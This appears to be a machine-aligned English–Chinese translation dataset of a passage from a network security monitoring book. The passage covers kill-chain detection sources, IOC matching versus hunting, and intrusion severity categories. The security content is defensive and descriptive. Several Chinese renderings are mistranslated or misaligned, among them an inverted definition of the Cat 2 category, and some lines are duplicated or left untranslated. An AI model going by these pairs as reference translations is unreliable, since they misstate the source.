  zh: '*链模型*'
- en: '**190** Chapter 9'
  id: totrans-403
  prefs: []
  type: TYPE_NORMAL
  zh: '**190** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-404
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: (3) enumeration, (4) gaining access, (5) escalating privilege, (6) pilfering,
    (7) covering tracks, (8) creating backdoors . Others have their own versions
  id: totrans-405
  prefs: []
  type: TYPE_NORMAL
  zh: （3）枚举，（4）获取访问权限，（5）提升权限，（6）盗窃，（7）掩盖痕迹，（8）创建后门。其他人有自己的版本
- en: of the steps taken by an adversary when compromising a target .
  id: totrans-406
  prefs: []
  type: TYPE_NORMAL
  zh: 对手在入侵目标时所采取的步骤。
- en: What makes the approach offered by Hutchins, Cloppert, and Amin unique
  id: totrans-407
  prefs: []
  type: TYPE_NORMAL
  zh: Hutchins、Cloppert 和 Amin 提出的这种方法的独特之处在于
- en: is its focus on aligning one’s security program with the steps in the intrusion
  id: totrans-408
  prefs: []
  type: TYPE_NORMAL
  zh: 它的特点是专注于将安全程序与入侵步骤对齐
- en: kill chain . They show example technologies to detect, deny, disrupt, degrade,
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: 杀链。他们展示了用于检测、拒绝、干扰、降级的示例技术，
- en: and/or deceive the adversary . NSM fits this model wel , because it provides
    a
  id: totrans-410
  prefs: []
  type: TYPE_NORMAL
  zh: 并/或欺骗对手。NSM 很适合这种模型，因为它提供了一个
- en: way to detect and respond to intruders before they accomplish their mission
    .
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: 在入侵者完成任务之前，发现并响应入侵者的一种方法。
- en: Therefore, the intrusion kill chain offers a powerful model for identifying
    the
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，入侵杀链为识别提供了一个强大的模型
- en: data we need to col ect .
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要收集的数据。
- en: The most robust NSM operation will have a detection method for each
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 最强大的 NSM 操作将为每个
- en: step in the intrusion kill chain, with data sources that vary according to the
    net-
  id: totrans-415
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵杀链中的一步，数据源根据网络情况有所不同-
- en: work . Figure 9-4 shows the intrusion kill chain with sample data sources, includ-
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
  zh: 网络。图 9-4 显示了入侵杀链及其示例数据源，包括-
- en: ing host, network, application, and nontechnical .
  id: totrans-417
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描主机、网络、应用程序和非技术性内容。
- en: Intrusion Kill Chain
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵杀链
- en: Detection Method
  id: totrans-419
  prefs: []
  type: TYPE_NORMAL
  zh: 检测方法
- en: Reconnaissance
  id: totrans-420
  prefs: []
  type: TYPE_NORMAL
  zh: 侦察
- en: Web access logs
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: 网站访问日志
- en: Weaponization
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: 武器化
- en: Extracted content
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
  zh: 提取内容
- en: Delivery
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: 交付
- en: User report
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: 用户报告
- en: Exploitation
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: 利用
- en: Endpoint assessment
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: 端点评估
- en: Installation
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: 安装
- en: Endpoint assessment
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
  zh: 端点评估
- en: Command and control
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
  zh: 命令与控制
- en: Transaction data
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
  zh: 交易数据
- en: Actions on intent
  id: totrans-432
  prefs: []
  type: TYPE_NORMAL
  zh: 基于意图的操作
- en: Memory analysis
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: 内存分析
- en: '*Figure 9-4: Intrusion kill chain and possible detection*'
  id: totrans-434
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9-4：入侵杀链和可能的检测*'
- en: '*sources and methods*'
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: '*来源与方法*'
- en: To understand Figure 9-4, suppose that an intruder wants to compromise
  id: totrans-436
  prefs: []
  type: TYPE_NORMAL
  zh: 要理解图 9-4，假设一个入侵者想要入侵
- en: a certain company in order to steal data . He decides to conduct a spear phish-
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: 一个特定的公司，以窃取数据。他决定进行定向钓鱼攻击-
- en: ing attack to gain initial access to the target . To identify users at the company,
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: 向目标发起攻击以获得初始访问权限。要识别公司中的用户，
- en: he downloads all documents from the company’s website that contain email
  id: totrans-439
  prefs: []
  type: TYPE_NORMAL
  zh: 他从公司网站下载所有包含电子邮件地址的文件
- en: addresses of company users . The intruder crafts an enticing phishing email,
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
  zh: 公司用户的电子邮件地址。入侵者设计了一封诱人的钓鱼邮件，
- en: inserts exploit code into an at achment, and transmits the malicious message
    to a
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
  zh: 将利用代码插入到附件中，并将恶意信息传送给
- en: set of users at the company . Once a victim user clicks the malicious attachment,
  id: totrans-442
  prefs: []
  type: TYPE_NORMAL
  zh: 公司的一组用户。一旦受害用户点击恶意附件，
- en: which is malware that will exploit a vulnerability in the user’s word processing
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件会利用用户文字处理应用程序中的漏洞，
- en: application, the malware establishes an outbound command-and-control chan-
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 在应用程序中，恶意软件建立了外向的命令与控制通道，
- en: nel to a site control ed by the intruder . At that point, the intruder is ready
    to
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
  zh: 通道将会连接到由入侵者控制的站点。在这个阶段，入侵者已经准备好
- en: begin looking for the data he wants to steal .
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 开始寻找他想窃取的数据。
- en: '*(continued)*'
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
  zh: '*(续)*'
- en: NSM Operations **191**
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 操作 **191**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Figure 9-4 shows how various sources and methods could be used to
  id: totrans-450
  prefs: []
  type: TYPE_NORMAL
  zh: 图9-4展示了如何利用不同来源和方法进行数据收集。
- en: detect each phase of the intrusion kill chain . The CIRT could analyze access
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: 检测入侵链的每个阶段。CIRT可以分析访问
- en: logs to detect an intruder using a search engine to find email addresses on
    the
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
  zh: 日志用于通过搜索引擎检测入侵者，查找电子邮件地址。
- en: company’s website . As the phishing message passes through the company’s
  id: totrans-453
  prefs: []
  type: TYPE_NORMAL
  zh: 公司的网站。当钓鱼邮件通过公司网站时，
- en: email servers, automated processing software could extract the malicious at
    ach-
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
  zh: 电子邮件服务器、自动处理软件可以提取恶意附件，
- en: ment and analyze it for suspicious features . One or more recipients of the
    phish-
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
  zh: 并分析其是否存在可疑特征。钓鱼邮件的一个或多个收件人可能会报告收到此邮件。
- en: ing message could report receiving it .
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: 在被钓鱼的信息中，收件人可能报告说他们收到了该信息。
- en: The CIRT could use an endpoint assessment tool to find indicators of com-
  id: totrans-457
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT可以使用端点评估工具查找相关的指示器，
- en: promise created by the exploitation of a vulnerable word processing applica-
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击成功后，利用了一个易受攻击的文字处理应用程序漏洞，
- en: tion and the instal ation of malware that fol ows . The CIRT could observe the
  id: totrans-459
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞的利用和随后的恶意软件安装。CIRT可以观察
- en: command-and-control channel in transaction data col ected by its SO platform
    .
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: 在其SO平台收集的事务数据中，发现命令与控制通道。
- en: Final y, to see individual commands executed by the intruder, the CIRT might
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，为了查看入侵者执行的个别命令，CIRT可能...
- en: analyze memory captured from one or more victim systems .
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: 分析从一个或多个受害系统中捕获的内存。
- en: These sample detection sources and methods will not be available to all
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
  zh: 这些示例检测来源和方法并非所有组织都可以使用，
- en: organizations . You may need to rely more heavily on the tools you have avail-
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
  zh: 组织。你可能需要更加依赖你现有的工具，
- en: able . It is likely that at the start of the NSM journey, many CIRTs will see
    gaps
  id: totrans-465
  prefs: []
  type: TYPE_NORMAL
  zh: 很可能在NSM旅程的开始阶段，许多CIRT将会看到存在差距。
- en: in their ability to detect all phases of the intrusion kill chain . Smart CIRTs
    will
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
  zh: 在检测入侵链的各个阶段方面具有强大能力的智能CIRT将能够...
- en: work to meet those gaps, using a combination of technical and nontechnical
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
  zh: 针对这些差距，CIRT可以采取措施，结合技术与非技术手段来弥补。
- en: methods, and they will build countermeasures to try to deny, disrupt, degrade,
  id: totrans-468
  prefs: []
  type: TYPE_NORMAL
  zh: 方法，他们将构建反制措施以试图拒绝、干扰、削弱...
- en: and/or deceive the adversary . Not all measures will work against all attack
  id: totrans-469
  prefs: []
  type: TYPE_NORMAL
  zh: 并/或欺骗对手。并非所有的措施都能对所有攻击方法有效，
- en: methods, but resisting or detecting “higher” up in the chain (that is, earlier)
  id: totrans-470
  prefs: []
  type: TYPE_NORMAL
  zh: 但是在链条的“更高”阶段（即更早的阶段）进行防御或检测是有意义的。
- en: gives the defender the best chance to prevent the adversary from accomplish-
  id: totrans-471
  prefs: []
  type: TYPE_NORMAL
  zh: 给防御者提供最佳机会，以防止对手实现其目的。
- en: ing his mission .
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: 完成其任务。
- en: The bottom line is that collection requires several components in order
  id: totrans-473
  prefs: []
  type: TYPE_NORMAL
  zh: 关键是收集需要多个组件来实现，
- en: 'to be effective. These include:'
  id: totrans-474
  prefs: []
  type: TYPE_NORMAL
  zh: 要有效，这些方法包括：
- en: • Data from the host, network, and applications forms the technical
  id: totrans-475
  prefs: []
  type: TYPE_NORMAL
  zh: • 来自主机、网络和应用程序的数据构成了技术基础。
- en: foundation
  id: totrans-476
  prefs: []
  type: TYPE_NORMAL
  zh: 基础
- en: • A process to accept reports from third parties and constituents to
  id: totrans-477
  prefs: []
  type: TYPE_NORMAL
  zh: • 一个过程来接收来自第三方和利益相关方的报告，
- en: gather nontechnical data
  id: totrans-478
  prefs: []
  type: TYPE_NORMAL
  zh: 收集非技术数据
- en: • A database, ticketing system, or other platform to manage this
  id: totrans-479
  prefs: []
  type: TYPE_NORMAL
  zh: • 数据库、工单系统或其他平台用于管理此
- en: information
  id: totrans-480
  prefs: []
  type: TYPE_NORMAL
  zh: 信息
- en: We’ve discussed SO as one technical tool for data collection, but it’s not
  id: totrans-481
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经讨论了SO作为数据收集的一种技术工具，但它并非万能。
- en: the only method available. Your organization can use email, help desk staff,
  id: totrans-482
  prefs: []
  type: TYPE_NORMAL
  zh: 唯一可用的方法。你的组织可以通过电子邮件、帮助台人员，
- en: and related processes to manage the nontechnical collection duties.
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
  zh: 以及相关流程来管理非技术性的收集工作。
- en: Some organizations end the NSM process at the collection phase. They
  id: totrans-484
  prefs: []
  type: TYPE_NORMAL
  zh: 一些组织在NSM过程中的收集阶段就结束了。他们...
- en: regard NSM collection tools and techniques as yet another set of systems
  id: totrans-485
  prefs: []
  type: TYPE_NORMAL
  zh: 将NSM收集工具和技术视为另一套系统
- en: to deploy and discard. They view collection as the end itself, instead of a
  id: totrans-486
  prefs: []
  type: TYPE_NORMAL
  zh: 部署并丢弃。它们把收集当作最终目的，而不是
- en: means to an end. Don’t get caught in this trap! While well-instrumented
  id: totrans-487
  prefs: []
  type: TYPE_NORMAL
  zh: 不要陷入这个陷阱！虽然使用完善工具的
- en: networks are rare, take the next step and do something with the data.
  id: totrans-488
  prefs: []
  type: TYPE_NORMAL
  zh: 网络很少出现时，采取下一步并处理数据。
- en: Enter the analysis phase.
  id: totrans-489
  prefs: []
  type: TYPE_NORMAL
  zh: 进入分析阶段。
- en: '**192** Chapter 9'
  id: totrans-490
  prefs: []
  type: TYPE_NORMAL
  zh: '**192** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-491
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Analysis***'
  id: totrans-492
  prefs: []
  type: TYPE_NORMAL
  zh: '***分析***'
- en: Analysis is the process of identifying and validating normal, suspicious, and
  id: totrans-493
  prefs: []
  type: TYPE_NORMAL
  zh: 分析是识别和验证正常、可疑和
- en: malicious activity. IOCs expedite this process. Formally, IOCs are manifes-
  id: totrans-494
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意活动。IOC加速了这个过程。正式而言，IOC是敌方行为的表现—
- en: tations of observable or discernible adversary actions. Informally, IOCs are
  id: totrans-495
  prefs: []
  type: TYPE_NORMAL
  zh: 观察到或可辨别的敌方行为的表现。非正式地，IOC是
- en: ways to codify adversary activity so that technical systems can find intruders
  id: totrans-496
  prefs: []
  type: TYPE_NORMAL
  zh: 编码敌方活动的方式，以便技术系统能够找到入侵者
- en: in digital evidence. For example, the Mandiant APT1 report ( *http://www*
  id: totrans-497
  prefs: []
  type: TYPE_NORMAL
  zh: 在数字证据中。例如，Mandiant APT1报告（ *http://www*
- en: '*.mandiant.com/apt1/*) released in February 2013 listed more than 3,000 IOCs,'
  id: totrans-498
  prefs: []
  type: TYPE_NORMAL
  zh: '*.mandiant.com/apt1/*) 该报告于2013年2月发布，列出了超过3,000个IOC（指标）。'
- en: including IP addresses, domain names, and MD5 hashes of tools used by
  id: totrans-499
  prefs: []
  type: TYPE_NORMAL
  zh: 包括IP地址、域名以及恶意工具的MD5哈希值
- en: Unit 61398 of the People’s Liberation Army. (Mandiant identifies certain
  id: totrans-500
  prefs: []
  type: TYPE_NORMAL
  zh: 中国人民解放军61398部队。（Mandiant识别出某些
- en: threat groups with the prefix APT, followed by a number, such as APT1,
  id: totrans-501
  prefs: []
  type: TYPE_NORMAL
  zh: 威胁团体以APT为前缀，后跟一个数字，如APT1，
- en: APT2, and so on.)
  id: totrans-502
  prefs: []
  type: TYPE_NORMAL
  zh: APT2，等等。）
- en: I refer to relying on IOCs to find intruders as *IOC-centric analysis*, or
  id: totrans-503
  prefs: []
  type: TYPE_NORMAL
  zh: 我将依赖IOC来寻找入侵者称为*IOC中心分析*，或
- en: '*matching*. Analysts match IOCs to evidence to identify suspicious or mali-'
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
  zh: '*匹配*。分析人员将IOC与证据进行匹配，以识别可疑或恶意'
- en: cious activity, and then validate their findings.
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
  zh: 可疑活动，然后验证他们的发现。
- en: Matching is not the only way to find intruders. More advanced NSM
  id: totrans-506
  prefs: []
  type: TYPE_NORMAL
  zh: 匹配并不是寻找入侵者的唯一方法。更先进的NSM
- en: operations also pursue *IOC-free analysis*, or *hunting*.
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
  zh: 操作还追求 *无IOC分析*，或 *猎捕*。
- en: In the mid-2000s, the US Air Force popularized the term *hunter-killer* in
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
  zh: 在2000年代中期，美国空军普及了*猎杀者*这一术语
- en: the digital world. Security experts performed *friendly force projection* on
    their networks, examining data and sometimes occupying the systems themselves
  id: totrans-509
  prefs: []
  type: TYPE_NORMAL
  zh: 数字世界中。安全专家对他们的网络进行了*友军力量投射*，检查数据并有时占领系统本身
- en: in order to find advanced threats. Today, NSM professionals like David Bianco
  id: totrans-510
  prefs: []
  type: TYPE_NORMAL
  zh: 为了发现高级威胁。今天，像David Bianco这样的NSM专业人员
- en: ( *http://detect-respond.blogspot.com/*) and Aaron Wade ( *http://forensicir.blogspot*
  id: totrans-511
  prefs: []
  type: TYPE_NORMAL
  zh: (*http://detect-respond.blogspot.com/*) 和 Aaron Wade (*http://forensicir.blogspot*
- en: '*.com/*) promote network “hunting trips,” during which a senior investigator'
  id: totrans-512
  prefs: []
  type: TYPE_NORMAL
  zh: '*.com/*) 促进网络“猎捕之旅”，在这些旅程中，一位高级调查员'
- en: with a novel way to detect intruders guides junior analysts through data and
  id: totrans-513
  prefs: []
  type: TYPE_NORMAL
  zh: 用一种新颖的方式来检测入侵者，指导初级分析师通过数据并
- en: systems looking for signs of the adversary. Upon validating the technique (and
  id: totrans-514
  prefs: []
  type: TYPE_NORMAL
  zh: 系统在寻找敌方的痕迹。在验证技术后（以及
- en: responding to any enemy actions), the hunters incorporate the new detection
  id: totrans-515
  prefs: []
  type: TYPE_NORMAL
  zh: 响应任何敌方行动时，猎手们将新的检测方法纳入其中
- en: method into a CIRT’s IOC-centric operations. (Chapters 10 and 11 contrast
  id: totrans-516
  prefs: []
  type: TYPE_NORMAL
  zh: 方法进入CIRT的IOC中心操作。（第10章和第11章对比
- en: the matching and hunting methodologies to demonstrate the strengths and
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
  zh: 匹配和猎捕方法以展示其优势和
- en: weaknesses of each.)
  id: totrans-518
  prefs: []
  type: TYPE_NORMAL
  zh: 每个的弱点。）
- en: '**Intrusions and Incidents**'
  id: totrans-519
  prefs: []
  type: TYPE_NORMAL
  zh: '**入侵与事件**'
- en: Analysts use data to identify and validate intrusions. Intrusions are one
  id: totrans-520
  prefs: []
  type: TYPE_NORMAL
  zh: 分析人员使用数据来识别并验证入侵。入侵是其中之一
- en: example of an incident. Other examples of incidents include disruption
  id: totrans-521
  prefs: []
  type: TYPE_NORMAL
  zh: 一个事件的例子。其他事件的例子包括因断开网络电缆而导致的中断
- en: caused by DDoS attacks, the loss or theft of a mobile device, and lost con-
  id: totrans-522
  prefs: []
  type: TYPE_NORMAL
  zh: 由DDoS攻击引起的，移动设备的丢失或盗窃，以及丢失的连接
- en: nectivity due to a severed network cable. But just what is an *intrusion*, and
  id: totrans-523
  prefs: []
  type: TYPE_NORMAL
  zh: 连接性丧失。但究竟什么是*入侵*，以及
- en: what is an *incident*?
  id: totrans-524
  prefs: []
  type: TYPE_NORMAL
  zh: 什么是*事件*？
- en: '*Intrusions* are policy violations or computer security incidents. In their'
  id: totrans-525
  prefs: []
  type: TYPE_NORMAL
  zh: '*入侵*是政策违反或计算机安全事件。在他们的'
- en: book, *Incident Response and Computer Forensics, Second Edition* (McGraw-Hill
  id: totrans-526
  prefs: []
  type: TYPE_NORMAL
  zh: 书籍《事件响应与计算机取证（第二版）》(McGraw-Hill
- en: Osborne Media, 2003), Kevin Mandia and Chris Prosise define an *incident*
  id: totrans-527
  prefs: []
  type: TYPE_NORMAL
  zh: Osborne Media, 2003年），Kevin Mandia 和 Chris Prosise 定义了一个 *事件*
- en: as “any unlawful, unauthorized, or unacceptable action that involves a
  id: totrans-528
  prefs: []
  type: TYPE_NORMAL
  zh: 被定义为“任何非法、未经授权或不可接受的行为，涉及到
- en: computer system or a computer network.” These definitions leave plenty
  id: totrans-529
  prefs: []
  type: TYPE_NORMAL
  zh: 计算机系统或计算机网络。”这些定义留下了大量空间
- en: of room to maneuver, and your organization should decide what these
  id: totrans-530
  prefs: []
  type: TYPE_NORMAL
  zh: 操作空间，组织应该决定这些
- en: terms mean to you. Your goal should be to adopt internally consistent
  id: totrans-531
  prefs: []
  type: TYPE_NORMAL
  zh: 这些术语对你意味着什么。你的目标应该是采纳一致的内部
- en: definitions. For example, Figure 9-5 depicts a classification method
  id: totrans-532
  prefs: []
  type: TYPE_NORMAL
  zh: 定义。例如，图9-5展示了一种分类方法
- en: ( *http://taosecurity.blogspot.com/2009/06/information-security-incident.html*
    and *http://taosecurity.blogspot.com/2009/06/extending-information-security-incident*
  id: totrans-533
  prefs: []
  type: TYPE_NORMAL
  zh: （*http://taosecurity.blogspot.com/2009/06/information-security-incident.html*
    和 *http://taosecurity.blogspot.com/2009/06/extending-information-security-incident*
- en: '*.html*) that builds on a subset of intrusion categories, or *cat* levels,
    as popularized by the US Department of Defense.'
  id: totrans-534
  prefs: []
  type: TYPE_NORMAL
  zh: '*.html*) 构建在一部分入侵类别或 *cat* 级别的基础上，这些是由美国国防部推广的。'
- en: NSM Operations **193**
  id: totrans-535
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 操作 **193**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-536
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Name
  id: totrans-537
  prefs: []
  type: TYPE_NORMAL
  zh: 名称
- en: Description
  id: totrans-538
  prefs: []
  type: TYPE_NORMAL
  zh: 描述
- en: Cat 6
  id: totrans-539
  prefs: []
  type: TYPE_NORMAL
  zh: Cat 6
- en: Intruder conducted reconnaissance against asset with access to sensitive data.
  id: totrans-540
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者对具有访问敏感数据的资产进行了侦察。
- en: Cat 3
  id: totrans-541
  prefs: []
  type: TYPE_NORMAL
  zh: Cat 3
- en: Intruder tried to exploit asset with access to sensitive data, but failed.
  id: totrans-542
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者尝试利用具有访问敏感数据的资产，但失败。
- en: Cat 2
  id: totrans-543
  prefs: []
  type: TYPE_NORMAL
  zh: Cat 2
- en: Intruder compromised asset with access to sensitive data but did not obtain
  id: totrans-544
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者突破资产防护，访问敏感数据，但未获得数据。
- en: root- or administrator-level access.
  id: totrans-545
  prefs: []
  type: TYPE_NORMAL
  zh: 拥有 root 或管理员级别的访问权限。
- en: Cat 1
  id: totrans-546
  prefs: []
  type: TYPE_NORMAL
  zh: Cat 1
- en: Intruder compromised asset with ready access to sensitive data.
  id: totrans-547
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者突破资产防护，轻松访问敏感数据。
- en: Breach 3 Intruder established command-and-control channel from asset with ready
  id: totrans-548
  prefs: []
  type: TYPE_NORMAL
  zh: 破坏 3 入侵者从已获得访问权限的资产建立指挥控制通道
- en: access to sensitive data.
  id: totrans-549
  prefs: []
  type: TYPE_NORMAL
  zh: 对敏感数据进行访问。
- en: Breach 2 Intruder exfiltrated nonsensitive data or data that will facilitate
    access to sensitive data.
  id: totrans-550
  prefs: []
  type: TYPE_NORMAL
  zh: 破坏 2 入侵者窃取了非敏感数据或有助于访问敏感数据的数据。
- en: Breach 1 Intruder exfiltrated sensitive data or is suspected of exfiltrating
    sensitive data based on volume, etc.
  id: totrans-551
  prefs: []
  type: TYPE_NORMAL
  zh: 破坏 1 入侵者窃取了敏感数据或因数据量等原因被怀疑窃取了敏感数据。
- en: Crisis 3 Intruder publicized stolen data online or via mainstream media.
  id: totrans-552
  prefs: []
  type: TYPE_NORMAL
  zh: 危机 3 入侵者通过在线或主流媒体公开盗取的数据。
- en: Crisis 2 Data loss prompted government or regulatory investigation with fines
    or other legal consequences.
  id: totrans-553
  prefs: []
  type: TYPE_NORMAL
  zh: 危机 2 数据丢失导致政府或监管机构调查，并可能处以罚款或其他法律后果。
- en: Crisis 1 Data loss resulted in physical harm or loss of life.
  id: totrans-554
  prefs: []
  type: TYPE_NORMAL
  zh: 危机 1 数据丢失导致身体伤害或生命丧失。
- en: '*Figure 9-5: Suggested intrusion categories*'
  id: totrans-555
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 9-5：建议的入侵类别*'
- en: These categories are designed to help the analyst understand the out-
  id: totrans-556
  prefs: []
  type: TYPE_NORMAL
  zh: 这些类别旨在帮助分析员理解外部因素
- en: come and nature of an intrusion. For example, say an analyst determines
  id: totrans-557
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵的来临和性质。例如，假设分析员判断
- en: that an intruder compromised a computer by executing unauthorized
  id: totrans-558
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者通过执行未经授权的代码来突破计算机安全。
- en: code, perhaps by tricking a user into opening a malicious attachment that
  id: totrans-559
  prefs: []
  type: TYPE_NORMAL
  zh: 代码，可能是通过诱使用户打开一个恶意附件
- en: exploited a vulnerable Java installation. However, if the analyst further
  id: totrans-560
  prefs: []
  type: TYPE_NORMAL
  zh: 利用一个存在漏洞的 Java 安装。但如果分析员进一步
- en: determines that the outbound command-and-control channel was denied
  id: totrans-561
  prefs: []
  type: TYPE_NORMAL
  zh: 分析员判断出外发的指挥控制通道被拒绝
- en: by the enterprise proxy, the intrusion is classified as a Cat 1\. Because the
  id: totrans-562
  prefs: []
  type: TYPE_NORMAL
  zh: 如果通过企业代理，入侵被分类为 Cat 1。因为该
- en: intruder could not establish his command-and-control channel, the inci-
  id: totrans-563
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者无法建立他的指挥控制通道，事件为
- en: dent falls short of a Breach 3\.
  id: totrans-564
  prefs: []
  type: TYPE_NORMAL
  zh: 事件未达到破坏 3。
- en: As another example, suppose that an analyst finds that an intruder has
  id: totrans-565
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个例子，假设分析员发现入侵者已经
- en: compromised a computer by executing unauthorized code on the target. In
  id: totrans-566
  prefs: []
  type: TYPE_NORMAL
  zh: 通过执行未经授权的代码突破计算机安全。在
- en: this case, the intruder has also *exfiltrated*, or stolen, nonsensitive data,
    such as a user’s shopping list. If the CIRT acts quickly, it can contain the victim
  id: totrans-567
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，入侵者还*窃取*了非敏感数据，如用户的购物清单。如果 CIRT 迅速采取行动，能够控制受害者的损失。
- en: before the intruder steals sensitive data, or pivots from the initial victim
  id: totrans-568
  prefs: []
  type: TYPE_NORMAL
  zh: 在入侵者窃取敏感数据之前，或从初始受害者转移目标时
- en: to another victim’s system. If the CIRT succeeds, the incident is a Breach 2\.
  id: totrans-569
  prefs: []
  type: TYPE_NORMAL
  zh: 到另一个受害者的系统。如果 CIRT 成功，事件将被归类为破坏 2。
- en: If the CIRT fails, and the intruder steals sensitive data, the incident is a
  id: totrans-570
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 CIRT 失败，且入侵者窃取了敏感数据，则事件为
- en: Breach 1\. If the intruder chooses to publish the stolen data online, the inci-
  id: totrans-571
  prefs: []
  type: TYPE_NORMAL
  zh: 破坏 1。如果入侵者选择在线发布被盗数据，则事件为
- en: dent is a Crisis 3\.
  id: totrans-572
  prefs: []
  type: TYPE_NORMAL
  zh: 事件是危机 3。
- en: '**194** Chapter 9'
  id: totrans-573
  prefs: []
  type: TYPE_NORMAL
  zh: '**194** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-574
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Event Classification**'
  id: totrans-575
  prefs: []
  type: TYPE_NORMAL
  zh: '**事件分类**'
- en: CIRTs may classify incidents within their analysis console or via an incident
  id: totrans-576
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT 可能会在其分析控制台中或通过事件跟踪系统对事件进行分类。例如，开源的 Sguil 和 Snorby 控制台
- en: tracking system. For example, the open source Sguil and Snorby consoles
  id: totrans-577
  prefs: []
  type: TYPE_NORMAL
  zh: 跟踪系统。例如，开源的 Sguil 和 Snorby 控制台
- en: (discussed in Chapter 8) support incident classification using function keys.
  id: totrans-578
  prefs: []
  type: TYPE_NORMAL
  zh: （在第8章讨论）通过功能键支持事件分类。
- en: Other options include labeling results in Security Information and Event
  id: totrans-579
  prefs: []
  type: TYPE_NORMAL
  zh: 其他选项包括在安全信息和事件中标记结果
- en: Management (SIEM) or log management platforms.
  id: totrans-580
  prefs: []
  type: TYPE_NORMAL
- en: Classification should include the user ID of the analyst making the deci-
  id: totrans-581
  prefs: []
  type: TYPE_NORMAL
- en: sion, the time of the classification, the classification itself, and an optional
  id: totrans-582
  prefs: []
  type: TYPE_NORMAL
- en: comments field. Systems that support forwarding events to more senior
  id: totrans-583
  prefs: []
  type: TYPE_NORMAL
- en: analysts are helpful. Collaboration and social discussions of incident data
  id: totrans-584
  prefs: []
  type: TYPE_NORMAL
- en: (such as tagging, chatrooms, and forums) help improve the decision-
  id: totrans-585
  prefs: []
  type: TYPE_NORMAL
- en: making process.
  id: totrans-586
  prefs: []
  type: TYPE_NORMAL
- en: The bottom line for the analysis process is that analysts must count and
  id: totrans-587
  prefs: []
